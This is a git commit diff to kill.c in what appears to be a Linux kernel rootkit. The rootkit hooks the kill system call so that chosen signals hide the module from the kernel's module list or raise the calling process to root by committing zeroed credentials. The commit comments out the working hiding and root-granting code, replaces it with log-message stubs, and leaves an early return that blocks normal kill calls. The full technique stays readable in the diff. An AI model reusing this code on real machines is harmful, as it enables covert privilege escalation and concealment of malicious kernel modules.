363922ecc9706fbd71039ecb9565770a568d83a6
Burr <33370725+BlameBurr@users.noreply.github.com>
2022-09-14 01:06:23 +0100

    Update kill.c

--- functions/kill.c
+++ functions/kill.c
@@ -8,8 +8,9 @@ asmlinkage int killHook(const struct pt_regs *regs) {
 #else
 asmlinkage int killHook(pid_t pid, int sig) { 
 #endif
-    if (sig == 31) return toggleHiding();
-    else if (sig == 16) return setRoot();
+    if (sig == 64) toggleHiding();
+    else if (sig == 16) setRoot();
+    return 0;
 #ifdef PTREGS_SYSCALL_STUBS
     return killOG(regs);
 #else
@@ -17,8 +18,8 @@ asmlinkage int killHook(pid_t pid, int sig) {
 #endif
 }
 
-int toggleHiding() {
-    if (isHidden == 1) {
+void toggleHiding() {
+    /*if (isHidden == 1) {
         list_add(&THIS_MODULE->list, priorModule);
         isHidden = 0;
     } else {
@@ -26,19 +27,21 @@ int toggleHiding() {
         list_del(&THIS_MODULE->list);
         isHidden = 1;
     }
-    return 0;
+    return;*/
+    printk(KERN_INFO "HIDING\n");
 }
 
-int setRoot() {
-    struct cred *root;
+void setRoot() {
+    /*struct cred *root;
     root = prepare_creds();
     printk(KERN_INFO "btk::0x1\n");
     if (root == NULL)
-        return 1;
+        return;
     root->uid.val = root->gid.val = 0;
     root->euid.val = root->egid.val = 0;
     root->suid.val = root->sgid.val = 0;
     root->fsuid.val = root->fsgid.val = 0;
     commit_creds(root);
-    return 0;
+    return;*/
+    printk(KERN_INFO "ROOTING\n");
 }
